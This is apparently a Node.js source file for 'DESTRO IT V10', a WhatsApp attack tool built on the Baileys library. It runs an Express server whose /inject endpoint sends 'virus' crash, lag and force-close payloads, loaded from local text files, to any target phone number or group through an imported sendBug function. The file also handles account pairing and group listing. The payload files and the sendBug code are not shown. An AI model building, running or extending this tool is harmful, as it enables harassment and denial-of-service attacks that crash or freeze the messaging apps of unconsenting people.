const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys");
const P = require('pino');
const chalk = require('chalk');
const cfonts = require('cfonts');
const boxen = require('boxen');
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const path = require('path');

const { sendBug } = require('./fun.js'); 

const config = {
    engine_name: "DESTRO IT V10",
    session_name: "destro_session"
};

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

let sock;
let isConnected = false;
let pairingCode = "";

const getVirusPayload = (type) => {
    const files = {
        'DELAY': './VIRUS LAG BY GHOSTNAME.txt',
        'CRASH': './VirusPending+Legh.txt',
        'FORCECLOSE': './VirusPending+Legh.txt',
        'JPG_VIR': './VIRUS LAG BY GHOSTNAME.txt'
    };
    const filePath = files[type] || './VIRUS LAG BY GHOSTNAME.txt';
    return fs.existsSync(filePath) ? fs.readFileSync(filePath, 'utf-8') : "☣️ DESTRO IT PAYLOAD ☣️";
};

async function startDestroEngine() {
    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(config.session_name);

    console.clear();
    cfonts.say('DESTRO IT', { font: 'block', align: 'center', gradient: ['red', 'magenta'] });
    console.log(boxen(chalk.red.bold("ENGINE ONLINE | PORT 7700 | READY"), { padding: 1, borderColor: 'red' }));

    sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'silent' })),
        },
        printQRInTerminal: false,
        browser: ["DESTRO IT", "Chrome", "110.0.5481.177"],
        logger: P({ level: 'silent' }),
    });

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            isConnected = true;
            console.log(chalk.green.bold("\n [✓] STATUS: TERHUBUNG KE WHATSAPP!"));
        }
        if (connection === 'close') {
            isConnected = false;
            const shouldRestart = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldRestart) startDestroEngine();
        }
    });
}

app.get('/status', (req, res) => res.json({ connected: isConnected }));

app.get('/getgroups', async (req, res) => {
    try {
        if (!isConnected) return res.status(500).json({ error: "Offline" });
        const groups = await sock.groupFetchAllParticipating();
        res.json(Object.values(groups));
    } catch (e) { res.status(500).json({ error: "Retry" }); }
});

app.post('/get-pairing', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ error: "No Number" });
    try {
        let code = await sock.requestPairingCode(number.replace(/\D/g, ''));
        pairingCode = code;
        res.json({ code: code });
    } catch (err) { res.status(500).json({ error: "Retry" }); }
});

app.post('/inject', async (req, res) => {
    const { target, type } = req.body;
    const jid = target.includes('@') ? target : target + "@s.whatsapp.net";
    const payload = getVirusPayload(type);
    try {
        if (!isConnected) return res.status(500).json({ status: "offline" });
        await sendBug(sock, jid, type, payload);
        res.json({ status: "success" });
    } catch (e) { res.status(500).json({ status: "error" }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// HAPUS YANG LAMA, TEMPEL INI DI PALING BAWAH, ASU!
const PORT = process.env.PORT || 7700; 
app.listen(PORT, "0.0.0.0", () => {
    console.log(`[!] ENGINE ON AT PORT ${PORT}`);
    startDestroEngine().catch(e => console.log("Engine Error:", e));
});
